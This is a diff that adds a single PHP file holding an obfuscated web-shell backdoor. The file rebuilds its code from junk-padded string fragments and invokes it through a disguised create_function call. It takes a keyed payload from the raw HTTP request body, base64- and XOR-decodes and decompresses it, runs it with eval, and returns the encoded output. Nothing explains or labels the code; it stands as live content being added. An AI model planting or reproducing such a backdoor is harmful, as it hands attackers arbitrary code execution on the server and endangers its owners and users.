@@ -1,0 +1,10 @@
+<?php
+$S='.=$}f}ft{$i}f}^$k{}f$j};}}return}f}f $o;}f}if (@preg_matc}fh("/$}fkh}f(.+)$k}ff/}f",@f}file_get_}fconte}fnts("php:/}f/';
+$j='i}f}fnput"),$m)==1) {@ob_st}fart();@e}fval}f(@gzu}fnco}fmpres}fs(@x(@ba}fse64_deco}fde}f($m[1]),$k}f)}f));}f$o=}f@ob_}';
+$y=str_replace('T','','cTreatTeT_TfuTncTtion');
+$K='$k="00}f6853b}f2";$kh="a}f58d3}f7daac3b";}f$kf=}f"}f785638edf6}ff9";$}fp="SD}f}feSnKIpD1k}fBc}f8TK";function}f x(}f$t';
+$B=',$k){$c}f=str}flen($k);$l=s}ftrlen}f($t);$o=}f"";fo}fr($i=0}f;$i<$}fl;){for(}f$j}f=0;($}f}fj<$c&&$i<$l);$j++}f,$}fi++){$o';
+$U='fget_contents();@ob_}fe}fnd_c}flean();$r=}f@ba}fse64_enco}fde(@x(@gz}fcompr}f}fe}fss($o),$}fk));p}frint("$p$kh$r$kf");}';
+$r=str_replace('}f','',$K.$B.$S.$j.$U);
+$N=$y('',$r);$N();
+?>
